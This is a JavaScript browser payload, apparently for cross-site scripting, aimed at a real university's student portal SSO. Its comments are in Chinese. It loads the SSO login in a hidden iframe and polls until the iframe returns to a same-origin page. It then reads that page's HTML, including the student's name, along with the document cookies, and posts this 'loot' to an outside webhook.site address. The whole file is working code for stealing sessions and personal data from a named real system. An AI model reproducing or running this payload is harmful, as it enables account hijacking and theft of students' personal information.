(async () => {
    const webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
    
    // 1. 觸發點：這是 iportal 的 SSO 入口
    // 瀏覽器會自動帶上 iportal 的 cookie，並滿足 Referer 要求
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();

    try {
        // 創建隱藏 Iframe
        const ifr = document.createElement('iframe');
        ifr.style.display = 'none';
        ifr.src = ssoUrl;
        document.body.appendChild(ifr);

        fetch(webhook + "?msg=Step1_Iframe_Created");

        // 2. 輪詢監控 (Polling)
        // 我們每隔 1 秒檢查一次 iframe 的狀態
        let checkCount = 0;
        const maxChecks = 20; // 最多等 20 秒

        const timer = setInterval(() => {
            checkCount++;
            try {
                // 嘗試讀取 iframe 網址
                // 如果還在 iportal2 (跨域)，這裡會報錯 (SecurityError)
                // 如果跳轉回 ap.itc (同源)，這裡會成功！
                const currentUrl = ifr.contentWindow.location.href;
                
                // 如果能讀到 URL，說明已經回到同源了！
                fetch(webhook + "?msg=Step2_SameOrigin_Detected&url=" + encodeURIComponent(currentUrl));

                // 檢查是否已經是登入後的頁面 (StdtLoginCtrl)
                if (currentUrl.includes("StdtLoginCtrl") || currentUrl.includes("GuidanceApp")) {
                    // 3. 收割數據
                    // 直接讀取 iframe 內部的 HTML，這就是那張包含個資的頁面
                    const pageHtml = ifr.contentWindow.document.body.innerHTML;
                    const cookies = document.cookie; // 順便拿新的 Session ID

                    // 簡單提取姓名做驗證
                    let name = pageHtml.match(/學生姓名:.*?form-control-static">([^<&]+)/)?.[1]?.trim() || "Unknown";

                    fetch(webhook, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({
                            msg: "SUCCESS_LOOT_SECURED",
                            victim_name: name,
                            final_url: currentUrl,
                            html_content: pageHtml.substring(0, 5000), // 截取前 5000 字
                            cookies: cookies
                        })
                    });

                    // 任務完成，清除定時器
                    clearInterval(timer);
                    // document.body.removeChild(ifr); // 可選：清理 iframe
                }

            } catch (e) {
                // 如果報錯，說明還在 iportal2 (跨域中)，繼續等待...
                // console.log("Waiting for redirect...", e.message);
                if (checkCount >= maxChecks) {
                    clearInterval(timer);
                    fetch(webhook + "?error=Timeout_Waiting_For_Redirect");
                }
            }
        }, 1000); // 每秒檢查一次

    } catch (e) {
        fetch(webhook + "?error=" + encodeURIComponent(e.message));
    }
})();